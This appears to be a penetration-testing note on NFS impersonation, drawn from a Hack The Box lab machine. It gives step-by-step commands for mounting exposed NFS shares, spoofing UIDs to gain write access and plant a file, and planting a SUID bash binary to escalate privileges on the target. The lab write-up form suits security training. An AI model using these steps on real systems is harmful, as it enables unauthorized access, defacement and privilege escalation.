---
description: >-
  NFS has no protocol for authorization or authentication, making it a
  vulnerable for misconfiguration and therefore exploitation.
---

# NFS Impersonation

#### The vulnerability

NFS is a server/client system enabling users to share files and directories across a network and allowing those shares to be mounted locally. In this case the user and group id for the share is 1001. NFS looks at ID's and use the system for it. If we make a user with user 1001 and groupid 1001 that user would own those files.&#x20;

This vulnerbality can be found in: [https://app.hackthebox.com/machines/Squashed](https://app.hackthebox.com/machines/Squashed)

```bash
# List NFS shares
$ showmount -e 10.10.11.191                        
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Mount the share

```bash
# Mounting the share
sudo mount -t nfs 10.10.11.191:/var/www/html /mnt

# Checking access
find /mnt -ls                       
   133456      4 drwxr-xr--   5 2017     www-data     4096 Oct 17 09:15 /mnt
find: ‘/mnt/.htaccess’: Permission denied
find: ‘/mnt/index.html’: Permission denied
find: ‘/mnt/images’: Permission denied
find: ‘/mnt/css’: Permission denied
find: ‘/mnt/js’: Permission denied
```

Checking who's owner

```bash
# -d flag for listing only directory
ls -ld /mnt
drwxr-xr-- 5 2017 www-data 4096 Oct 17 09:15 /mnt

# Check group ID
$ cat /etc/group | grep www-data
www-data:x:33:
```

We find the userid is 2017 and groupid to be 33. So by making a dummy user with userid 2017 we get access to the files.

```bash
# Set userid for user
$ sudo useradd dummy
$ sudo usermod -u 2017 dummy
$ sudo groupmod -u 33 dummy          

# Drop into bash                                                                                                                                                                                                 
$ sudo su dummy -c bash 
```

Now we have access to the files and folders, even write access.

```bash
# Write simple html
echo "Powned" > /mnt/powned.html
```

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

## Another example

In /etc/exports you find a configuration file used by NFS server. It defines directories that are shared and specifies access and permissions, as well as restrictions for those shares.

```sh
# Example
cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/opt/share *(rw,no_subtree_check)    
```

If we create a user with the same uid and then copy bash in to the mounted folder the binary will be owned by the target user. We will copy /bin/bash from target to nfs share then with with a users of targets id copy it to /tmp then replacing the bash file on the share again. Add SUID and then run from target.

```sh
# Find out ID of user 
id username
uid=902601108(mczen)

# Allow UID creation over 60000
Edit /etc/logins.defs and change the UID_MAX value

# Add user on my machine
sudo useradd zen -u 902601108
uid=902601108(zen) gid=1001(zen) groups=1001(zen)

# An my attacker
cp bash /tmp/
rm -rf bash
cp /tmp/bash .
chmod +xs bash

# On target
./bash -p
```



